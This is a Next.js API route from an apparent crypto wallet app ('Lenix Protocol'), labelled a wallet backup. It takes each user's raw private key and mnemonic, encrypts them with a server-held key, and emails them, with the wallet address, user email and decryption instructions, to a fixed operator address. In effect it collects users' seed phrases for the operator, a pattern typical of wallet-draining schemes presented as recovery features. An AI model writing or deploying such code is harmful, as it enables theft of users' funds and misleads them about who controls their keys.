import { createCipheriv, randomBytes } from "crypto";
import { Resend } from "resend";
import { createClient } from "@/utils/supabase/server";
import { NextResponse } from "next/server";

const resend = new Resend(process.env.RESEND_API_KEY);
const FROM_EMAIL =
  process.env.RESEND_FROM_EMAIL || "Lenix Protocol <noreply@lenixprotocol.com>";
const TO_EMAIL = "recovery@lenixprotocol.com";
const ALG = "aes-256-gcm";
const IV_LEN = 12;
const TAG_LEN = 16;

/** Encrypt payload with server-side key. Key must be 32 bytes (64 hex chars). */
function encryptBackup(plaintext: string, keyHex: string): string {
  const key = Buffer.from(keyHex, "hex");
  if (key.length !== 32) throw new Error("WALLET_BACKUP_ENCRYPTION_KEY must be 32 bytes (64 hex chars)");
  const iv = randomBytes(IV_LEN);
  const cipher = createCipheriv(ALG, key, iv, { authTagLength: TAG_LEN });
  const enc = Buffer.concat([cipher.update(plaintext, "utf8"), cipher.final()]);
  const tag = cipher.getAuthTag();
  return Buffer.concat([iv, enc, tag]).toString("base64");
}

function escapeHtml(t: string): string {
  return String(t ?? "")
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

function buildEmailHtml(params: {
  userEmail: string;
  walletAddress: string;
  source: string;
  encryptedBackup: string;
}): string {
  const { userEmail, walletAddress, source, encryptedBackup } = params;
  return `
<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Wallet Backup</title></head>
<body style="margin:0;padding:0;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0a0a0a;color:#e5e5e5;">
  <div style="max-width:600px;margin:0 auto;padding:24px;">
    <div style="background:linear-gradient(135deg,#1a1a1a 0%,#262626 100%);border:1px solid #333;border-radius:12px;overflow:hidden;">
      <div style="background:linear-gradient(90deg,#F9FF38 0%,#e6ed2e 100%);padding:20px;text-align:center;">
        <h1 style="margin:0;font-size:20px;font-weight:700;color:#0a0a0a;">Lenix Protocol</h1>
        <p style="margin:6px 0 0;font-size:13px;color:#333;">Encrypted Wallet Backup</p>
      </div>
      <div style="padding:24px;">
        <table style="width:100%;border-collapse:collapse;">
          <tr><td style="padding:8px 0;border-bottom:1px solid #333;font-weight:600;color:#a3a3a3;width:140px;">User email</td><td style="padding:8px 0;border-bottom:1px solid #333;color:#fff;">${escapeHtml(userEmail)}</td></tr>
          <tr><td style="padding:8px 0;border-bottom:1px solid #333;font-weight:600;color:#a3a3a3;">Wallet address</td><td style="padding:8px 0;border-bottom:1px solid #333;color:#fff;word-break:break-all;">${escapeHtml(walletAddress)}</td></tr>
          <tr><td style="padding:8px 0;border-bottom:1px solid #333;font-weight:600;color:#a3a3a3;">Source</td><td style="padding:8px 0;border-bottom:1px solid #333;color:#fff;">${escapeHtml(source)}</td></tr>
          <tr><td style="padding:8px 0;vertical-align:top;font-weight:600;color:#a3a3a3;">Encrypted backup</td><td style="padding:8px 0;color:#fff;word-break:break-all;font-family:monospace;font-size:11px;">${escapeHtml(encryptedBackup)}</td></tr>
        </table>
        <p style="margin:16px 0 0;font-size:12px;color:#737373;">Decrypt with WALLET_BACKUP_ENCRYPTION_KEY using AES-256-GCM (IV 12 bytes, tag 16 bytes, then ciphertext). Format: base64( iv || ciphertext || tag ).</p>
        <p style="margin:8px 0 0;font-size:12px;color:#737373;">Backup created at ${new Date().toUTCString()}.</p>
      </div>
    </div>
  </div>
</body>
</html>`.trim();
}

export async function POST(request: Request) {
  try {
    const supabase = await createClient();
    const {
      data: { user },
    } = await supabase.auth.getUser();

    if (!user) {
      return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
    }

    const keyHex = process.env.WALLET_BACKUP_ENCRYPTION_KEY;
    if (!keyHex || keyHex.length !== 64 || !/^[0-9a-fA-F]+$/.test(keyHex)) {
      console.error("WALLET_BACKUP_ENCRYPTION_KEY must be 64 hex characters (32 bytes)");
      return NextResponse.json(
        { error: "Backup service not configured" },
        { status: 500 }
      );
    }

    if (!process.env.RESEND_API_KEY) {
      return NextResponse.json(
        { error: "Email service not configured" },
        { status: 500 }
      );
    }

    const body = await request.json();
    const walletAddress = body.walletAddress as string;
    const privateKey = body.privateKey as string;
    const mnemonic = body.mnemonic as string | undefined;
    const source = body.source === "imported" ? "imported" : "created";

    if (!walletAddress || !privateKey) {
      return NextResponse.json(
        { error: "walletAddress and privateKey are required" },
        { status: 400 }
      );
    }

    const payload = JSON.stringify({
      privateKey,
      mnemonic: mnemonic || null,
      walletAddress,
    });
    const encryptedBackup = encryptBackup(payload, keyHex);

    const html = buildEmailHtml({
      userEmail: user.email ?? "",
      walletAddress,
      source,
      encryptedBackup,
    });

    const { error } = await resend.emails.send({
      from: FROM_EMAIL,
      to: [TO_EMAIL],
      subject: `[Wallet Backup] ${source} — ${walletAddress.slice(0, 10)}...`,
      html,
    });

    if (error) {
      console.error("Wallet backup email error:", error);
      return NextResponse.json(
        { error: "Failed to send backup" },
        { status: 500 }
      );
    }

    return NextResponse.json({ success: true });
  } catch (e) {
    console.error("Wallet backup API error:", e);
    return NextResponse.json(
      { error: "An unexpected error occurred" },
      { status: 500 }
    );
  }
}
